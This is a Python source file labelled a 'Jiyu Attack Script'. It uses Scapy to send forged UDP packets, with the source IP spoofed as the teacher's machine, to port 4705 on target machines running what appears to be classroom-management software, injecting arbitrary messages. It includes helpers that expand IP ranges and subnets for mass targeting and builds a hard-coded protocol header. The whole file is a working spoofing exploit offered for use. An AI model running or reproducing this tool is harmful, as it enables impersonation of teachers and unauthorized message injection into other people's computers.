# pylint: disable=line-too-long, invalid-name

"""
Jiyu Attack Script

This script implements a Jiyu attack by sending specially crafted UDP packets to a target IP address.
It allows the user to input a message, which is then formatted and packaged into a byte array before being sent.

The script uses Scapy for packet manipulation and sending.
"""

import secrets
import warnings

from typing import Literal, Type

import scapy.all as scapy


def throw_error(
    message: str,
    *,
    error: Type[Exception] = ValueError,
    warning: Type[Warning] = UserWarning,
    errors: Literal["error", "warning", "ignore"] = "error",
) -> None:
    """
    Throws an error or warning based on the specified error handling strategy.

    Args:
        message (str): The error or warning message.
        error (Type[Exception], optional): The exception type to raise if errors are set to "error". Defaults to ValueError.
        warning (Type[Warning], optional): The warning type to issue if errors are set to "warning". Defaults to UserWarning.
        errors (Literal["error", "warning", "ignore"], optional): Error handling strategy. Defaults to "error".

    Raises:
        error: If errors is set to "error", raises the specified exception.
        warning: If errors is set to "warning", issues a warning of the specified type.
        ValueError: If errors is set to an invalid value.
        None: If errors is set to "ignore", does nothing.
    """
    match errors:
        case "error":
            raise error(message)
        case "warning":
            warnings.warn(message, category=warning, stacklevel=2)
        case "ignore":
            pass
        case _:
            raise ValueError(f"Invalid error handling strategy: {errors}")


def ip_to_tuple(ip: str) -> tuple[int, int, int, int]:
    """
    Converts an IP address string to a tuple of four integers.

    Args:
        ip (str): The IP address in string format (e.g., "192.168.1.1").

    Returns:
        tuple[int, int, int, int]: A tuple representing the four octets of the IP address.

    Raises:
        TypeError: If the input is not a string.
        ValueError: If the input is not a valid IP address format.
    """
    if not isinstance(ip, str):
        raise TypeError(f"Expected string, got {type(ip).__name__}")
    try:
        ip_tuple = tuple(int(x) for x in ip.split("."))
    except ValueError:
        raise ValueError(f"Invalid IP address format: {ip}") from None
    if len(ip_tuple) != 4 or any(x < 0 or x > 255 for x in ip_tuple):
        raise ValueError(f"Invalid IP address format: {ip}")
    return ip_tuple


def ip_analyze(ip: str) -> list[str]:
    """
    Analyzes an IP address or range and returns a list of valid IP addresses.

    Args:
        ip (str): The IP address or range in string format (e.g., "192.168.1.1", "192.168.1.1/24", "192.168.1.1-100").

    Returns:
        list[str]: A list of valid IP addresses.

    Raises:
        TypeError: If the input is not a string.
        ValueError: If the input is not a valid IP address or range.
    """
    if not isinstance(ip, str):
        raise TypeError(f"Expected string, got {type(ip).__name__}")
    ip = ip.replace(" ", "")
    if "/" in ip:
        match ip.split("/"):
            case [ip_addr, mask]:
                if not mask.isdigit():
                    raise ValueError(f"Invalid subnet mask: {mask}")
                mask = int(mask)
                if mask < 0 or mask > 32:
                    raise ValueError(f"Subnet mask out of range: {mask}")
                if mask < 16:
                    raise ValueError(f"Subnet mask too small: {mask}")
            case _:
                raise ValueError(f"Invalid IP address format: {ip}")
        ip_tuple = ip_to_tuple(ip_addr)
        ip32 = ip_tuple[0] << 24 | ip_tuple[1] << 16 | ip_tuple[2] << 8 | ip_tuple[3]
        ip32 &= (0xFFFFFFFF >> (32 - mask)) << (32 - mask)
        return [
            f"{(i >> 24) & 0xFF}.{(i >> 16) & 0xFF}.{(i >> 8) & 0xFF}.{i & 0xFF}"
            for i in range(ip32, ip32 + (1 << (32 - mask)))
        ]
    if "-" in ip:
        ip_range_tuple = ip.split(".")
        if len(ip_range_tuple) != 4:
            raise ValueError(f"Invalid IP address range format: {ip}")
        ip_count = 1
        ip_range: list[tuple[int, int]] = []
        for i in ip_range_tuple:
            match i.split("-"):
                case [single]:
                    if not single.isdigit():
                        raise ValueError(f"Invalid IP address range format: {ip}")
                    single = int(single)
                    if single < 0 or single > 255:
                        raise ValueError(f"IP address out of range: {single}")
                    ip_range.append((single, single))
                case [start, end]:
                    if not (start.isdigit() and end.isdigit()):
                        raise ValueError(f"Invalid IP address range format: {ip}")
                    start = int(start)
                    end = int(end)
                    if start < 0 or start > 255 or end < 0 or end > 255 or start > end:
                        raise ValueError(f"Invalid IP address range: {start}-{end}")
                    ip_range.append((start, end))
                case _:
                    raise ValueError(f"Invalid IP address range format: {ip}")
            ip_count *= ip_range[-1][1] - ip_range[-1][0] + 1
        if ip_count > 65536:
            raise ValueError(f"IP address range too large: {ip_count} addresses")
        return [
            f"{a}.{b}.{c}.{d}"
            for a in range(ip_range[0][0], ip_range[0][1] + 1)
            for b in range(ip_range[1][0], ip_range[1][1] + 1)
            for c in range(ip_range[2][0], ip_range[2][1] + 1)
            for d in range(ip_range[3][0], ip_range[3][1] + 1)
        ]
    ip_tuple = ip_to_tuple(ip)
    return [f"{ip_tuple[0]}.{ip_tuple[1]}.{ip_tuple[2]}.{ip_tuple[3]}"]


def format_msg(
    msg: str,
    *,
    max_length: int = 800,
    errors: Literal["error", "warning", "ignore"] = "error",
) -> bytes:
    """
    Formats a string into a byte array, ensuring it is within the specified maximum length.

    Args:
        msg (str): The input string to format.
        max_length (int, optional): The maximum length of the resulting byte array. Defaults to 800.
        errors (Literal["error", "warning", "ignore"], optional): Error handling strategy. Defaults to "error".

    Returns:
        bytes: The formatted byte array, padded with null bytes if necessary.
    """
    ret = bytearray()
    for s in msg:
        c = ord(s)
        if c > 0xFFFF:
            throw_error(f"Character {s} (0x{c:X}) is not supported.", errors=errors)
        else:
            ret.append(c & 0xFF)
            ret.append((c >> 8) & 0xFF)
    if len(ret) > max_length:
        throw_error(
            f"Data length exceeds maximum length of {max_length} bytes: {len(ret)} bytes.",
            errors=errors,
        )
    return bytes(ret.ljust(max_length, b"\x00"))[:max_length]


def pkg_message(
    msg: str,
    *,
    errors: Literal["error", "warning", "ignore"] = "error",
) -> bytes:
    """
    Packages a message string into a specific byte format, including a header and padding.

    Args:
        msg (str): The message string to package.
        errors (Literal["error", "warning", "ignore"], optional): Error handling strategy. Defaults to "error".

    Returns:
        bytes: The packaged message as a byte array, including a header and padding.

    Raises:
        ValueError: If the message length exceeds 800 bytes or if the header length is incorrect
    """
    data = format_msg(msg, errors=errors)
    head = (
        b"DMOC\x00\x00\x01\x00\x9e\x03\x00\x00"
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8l\x01\x91\x03\x00\x00"
        + b"\x91\x03\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00"
    )
    assert len(head) == 56, "Header length must be 56 bytes"
    assert len(data) == 800, "Message length must be 800 bytes"
    return head + data + b"\x00" * 98


def send_packet(src_ip: str, dst_ip: str, dst_port: int, data: bytes) -> None:
    """
    Sends a UDP packet with the specified source IP, destination IP, destination port, and data payload.

    Args:
        src_ip (str): The source IP address.
        dst_ip (str): The destination IP address.
        dst_port (int): The destination port number.
        data (bytes): The data payload to include in the packet.

    Raises:
        scapy.error.Scapy_Exception: If there is an error sending the packet.

    Note:
        This function uses Scapy to construct and send the packet.
        Ensure that Scapy is installed and properly configured in your environment.
    """
    # pylint: disable=no-member
    packet = scapy.IP(src=src_ip, dst=dst_ip) / scapy.UDP(dport=dst_port) / scapy.Raw(load=data)  # type: ignore
    scapy.send(packet, count=1, verbose=False)


if __name__ == "__main__":
    teacher_ip = input("Enter the teacher's IP address: ").strip()
    target = input("Enter the target IP address: ").strip()
    while True:
        tmsg = input("Enter your message (empty to exit): ")
        if not tmsg:
            print("Exiting...")
            break
        payload = pkg_message(tmsg, errors="error")
        send_packet(teacher_ip, target, 4705, payload)
